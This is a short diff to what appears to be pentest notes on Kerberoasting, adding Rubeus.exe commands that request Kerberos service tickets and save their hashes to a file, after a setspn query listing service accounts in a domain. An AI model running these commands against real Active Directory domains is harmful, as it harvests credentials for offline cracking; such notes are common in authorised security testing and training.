@@ -10,3 +10,9 @@ identify service principle name account :
 setspn -T UAP.local -Q */*
 ```
 
+using Rubeus.exe:
+```bash
+ .\Rubeus.exe kerberoast
+ .\Rubeus.exe kerberoast /outfile:a.txt
+```
+
